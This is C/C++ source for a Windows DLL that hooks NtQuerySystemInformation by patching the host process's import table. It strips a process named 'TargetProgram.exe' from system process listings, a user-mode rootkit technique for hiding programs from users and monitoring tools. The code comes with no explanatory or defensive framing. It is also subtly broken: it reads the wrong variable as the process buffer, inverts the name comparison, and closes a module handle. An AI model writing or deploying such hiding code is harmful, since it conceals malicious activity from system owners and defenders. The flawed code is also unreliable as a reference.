#include "Hooker.h"

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)(
	GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation")
	);

bool __stdcall DllMain(HINSTANCE hInstance,
	DWORD dwReason,
	LPVOID dwReserved
) {
	switch (dwReason) {
		case DLL_PROCESS_ATTACH:
			StartHook();
			break;
	}

	return TRUE;
}

void StartHook() {

	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);
	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(modInfo));

	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;

	PIMAGE_DOS_HEADER		pIDH = (PIMAGE_DOS_HEADER)		pAddress;
	PIMAGE_NT_HEADERS		pINH = (PIMAGE_NT_HEADERS)		(pAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER	pIOH = (PIMAGE_OPTIONAL_HEADER)	&(pINH->OptionalHeader);


	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress +
		pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	for (; pIID->Characteristics; pIID++)
		if(!strcmp((char*)(pAddress + pIID->Name), "ntdll.dll"))
			break;

	PIMAGE_THUNK_DATA		pITD			= (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA		pFirstThunkTest = (PIMAGE_THUNK_DATA)(pAddress + pIID->FirstThunk);
	PIMAGE_IMPORT_BY_NAME	pIIBN;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
		pIIBN = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (char*)pIIBN->Name))
			break;
		pFirstThunkTest++;
	}

	DWORD dwOld = NULL;
	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (DWORD)HookedNtQuerySystemInformation;
	VirtualProtect((LPVOID)&(pFirstThunkTest->u1.Function), sizeof(DWORD), dwOld, NULL);

	CloseHandle(hModule);
}

NTSTATUS WINAPI HookedNtQuerySystemInformation(

	__in		SYSTEM_INFORMATION_CLASS	SystemInformationClass,
	__inout		PVOID						SystemInformation,
	__in		ULONG						SystemInformationLength,
	__out_opt	PULONG						ReturnLength

) {

	NTSTATUS status = OriginalNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
	);

	if (SystemProcessInformation == SystemInformationClass && status == STATUS_SUCCESS) {


		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformationClass;

		do{

			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

			if (wcsncmp(L"TargetProgram.exe", pNext->ImageName.Buffer, pNext->ImageName.Length)) {
				if (!pNext->NextEntryOffset)
					pCurrent->NextEntryOffset = 0;
				else
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
			}

		} while (pCurrent->NextEntryOffset != 0); 
		

	}

	return status;

}